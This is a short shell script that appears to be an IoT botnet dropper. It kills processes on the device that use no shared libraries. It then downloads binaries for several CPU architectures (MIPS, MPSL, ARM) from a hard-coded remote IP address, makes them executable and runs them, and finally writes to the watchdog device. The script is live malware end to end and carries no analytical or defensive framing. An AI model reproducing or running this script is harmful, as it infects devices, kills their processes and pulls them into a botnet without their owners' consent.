#!/bin/sh

if [ -d "/tmp" ]; then
    cd /tmp
else
    busybox mkdir /tmp && cd /tmp
fi

for pid in /proc/[0-9]*; do pid_num="${pid##*/}"; if [ -r "$pid/maps" ]; then suspicious=true; while IFS= read -r line; do case "$line" in *"/lib/"*|*"/lib64/"*|*".so"*) suspicious=false; break;; esac; done < "$pid/maps"; if [ "$suspicious" = true ]; then kill -9 "$pid_num"; fi; fi; done

rm mips mpsl arm*
wget http://103.176.20.59/mips || busybox wget http://103.176.20.59/mips; chmod 777 mips; ./mips tvt;
wget http://103.176.20.59/mpsl || busybox wget http://103.176.20.59/mpsl; chmod 777 mpsl; ./mpsl tvt;
wget http://103.176.20.59/arm4 || busybox wget http://103.176.20.59/arm4; chmod 777 arm4; ./arm4 tvt;
wget http://103.176.20.59/arm5 || busybox wget http://103.176.20.59/arm5; chmod 777 arm5; ./arm5 tvt;
wget http://103.176.20.59/arm7 || busybox wget http://103.176.20.59/arm7; chmod 777 arm7; ./arm7 tvt;

WATCHDOG_DEVICE=""
for dev in /dev/watchdog /dev/watchdog0; do
    [ -c "$dev" ] && WATCHDOG_DEVICE="$dev" && break
done

[ -z "$WATCHDOG_DEVICE" ] && exit 1
echo "1" > "$WATCHDOG_DEVICE" || exit 1
